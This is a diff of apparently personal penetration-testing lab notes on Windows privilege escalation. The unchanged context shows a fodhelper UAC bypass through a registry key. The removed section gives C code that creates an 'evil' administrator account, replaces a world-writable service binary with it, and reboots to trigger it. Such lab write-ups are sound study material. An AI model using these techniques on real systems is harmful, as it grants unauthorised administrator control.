@@ -8,12 +8,7 @@ GROUP INFORMATION
 -----------------  
   
 Group Name                              Type             SID          Attributes  
-======================================================== ============ ================  
-Everyone                                Well-known group S-1-1-0      Mandatory group,  
-NT AUTHORITY\Local account and member   Well-known group S-1-5-114    Group used for d  
-BUILTIN\Administrators                  Alias            S-1-5-32-544 Group used for d  
-BUILTIN\Users                           Alias            S-1-5-32-545 Mandatory group,  
-NT AUTHORITY\INTERACTIVE                Well-known group S-1-5-4      Mandatory group,  
+======================================================== ============ ================    
 ...  
 Mandatory Label\Medium Mandatory Level  Label            S-1-16-8192
 ```
@@ -54,11 +49,7 @@ GROUP INFORMATION
 -----------------  
   
 Group Name                              Type             SID          Attributes  
-======================================================== ============ ================  
-Everyone                                Well-known group S-1-1-0      Mandatory group,  
-NT AUTHORITY\Local account and member   Well-known group S-1-5-114    Mandatory group,  
-BUILTIN\Administrators                  Alias            S-1-5-32-544 Mandatory group,  
-BUILTIN\Users                           Alias            S-1-5-32-545 Mandatory group,  
+======================================================== ============ ================    
 ...  
 Mandatory Label\High Mandatory Level    Label            S-1-16-12288  
   
@@ -156,160 +147,6 @@ REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /
 	**/f** - Add value silently  
   
 Running fodhelper again will throw a High-Integrity cmd shell  
-
-
-
-### Insecure File Perms
-
-Exploit services that run as _nt authority\\system_.  
-```powershell
-PS C:\Users\student> Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}  
-  
-Name                  State   PathName  
-----                  -----   --------  
-...  
-RpcSs                 Running C:\Windows\system32\svchost.exe -k rpcss  
-SamSs                 Running C:\Windows\system32\lsass.exe  
-Serviio               Running C:\Program Files\Serviio\bin\ServiioService.exe  
-ShellHWDetection      Running C:\Windows\System32\svchost.exe -k netsvcs  
-...
-```
-
-Serviio service stands out as it's installed in the Program Files directory.  
-
-Meaning the service is user-installed & the software dev is in charge of the dir structure as well as perms of the software.  
-
-Makes it more prone to privesc.  
-  
-  
-Enum the service's perms w/ [icacls](icacls.md)  
-```powershell
-C:\Users\student> icacls "C:\Program Files\Serviio\bin\ServiioService.exe"  
-C:\Program Files\Serviio\bin\ServiioService.exe BUILTIN\Users:(I)(F)  
-NT AUTHORITY\SYSTEM:(I)(F)  
-BUILTIN\Administrators:(I)(F)  
-APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)  
-  
-Successfully processed 1 files; Failed processing 0 files
-```
-
-| Mask | Permissions             |
-| ---- | ----------------------- |
-| F    | Full access             |
-| M    | Modify access           |
-| RX   | Read and execute access |
-| R    | Read-only access        |
-| W    | Write-only access       |
-
-Any user (BUILTIN\\Users) on the system has full read and write access to it.  
-  
-To exploit, replace ServiioService.exe with our own malicious binary and then trigger it by restarting the service or rebooting the machine.  
-  
-Ex:  
-```c
-#include <stdlib.h>  
-  
-int main ()  
-{  
-  int i;  
-    
-  i = system ("net user evil Ev!lpass /add");  
-  i = system ("net localgroup administrators evil /add");  
-  i = system ("net localgroup 'Remote Desktop Users' evil /add");  
-    
-  return 0;  
-}
-```
-	Create a user named "evil" and add that user to the local Administrators group using the _system_ function.  
-  
-We'll need to cross-compile on kali:  
-```bash
-i686-w64-mingw32-gcc adduser.c -o adduser.exe
-```
-
-  
-  
-Transfer and replace OG binary:  
-```powershell
-C:\Users\student> move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"  
-1 file(s) moved.  
-  
-C:\Users\student> move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"  
-1 file(s) moved.  
-  
-C:\Users\student> dir "C:\Program Files\Serviio\bin\"  
-Volume in drive C has no label.  
-Volume Serial Number is 56B9-BB74  
-  
-Directory of C:\Program Files\Serviio\bin  
-  
-01/26/2018  07:21 AM    <DIR>          .  
-01/26/2018  07:21 AM    <DIR>          ..  
-12/04/2016  08:30 PM               867 serviio.bat  
-01/26/2018  07:19 AM            48,373 ServiioService.exe  
-12/04/2016  08:30 PM                10 ServiioService.exe.vmoptions  
-12/04/2016  08:30 PM           413,696 ServiioService_original.exe  
-4 File(s)        462,946 bytes  
-2 Dir(s)   3,826,667,520 bytes free
-```
-
-
-As most services are managed by administrative users, we can't restart the service:  
-```powershell
-C:\Users\student> net stop Serviio  
-System error 5 has occurred.  
-  
-Access is denied.
-```
-
-
-Check start options of the service:  
-```powershell
-C:\Users\student>wmic service where caption="Serviio" get name, caption, state, startmode  
-Caption  Name     StartMode  State  
-Serviio  Serviio  Auto       Running
-```
-
-
-Check if our user has reboot rights:  
-```powershell
-C:\Users\student>whoami /priv  
-  
-PRIVILEGES INFORMATION  
-----------------------  
-  
-Privilege Name                Description                          State  
-============================= ==================================== ========  
-SeShutdownPrivilege           Shut down the system                 Disabled  
-SeChangeNotifyPrivilege       Bypass traverse checking             Enabled  
-SeUndockPrivilege             Remove computer from docking station Disabled  
-SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled  
-SeTimeZonePrivilege           Change the time zone                 Disabled
-```
-	**_Disabled_ state only indicates if the privilege is currently enabled for the running process (whoami).  
-  
-Reboot:  
-```powershell
-shutdown /r /t 0
-```
-
-
-Log back in with username "evil" with a password of "Ev!lpass" & check perms:  
-```powershell
-C:\Users\evil> net localgroup Administrators  
-Alias name     Administrators  
-Comment   Administrators have complete and unrestricted access to the computer/domain  
-  
-Members  
-  
--------------------------------------------------------------------------------  
-admin  
-Administrator  
-corp\Domain Admins  
-corp\offsec  
-evil  
-The command completed successfully.
-```
 
 
 
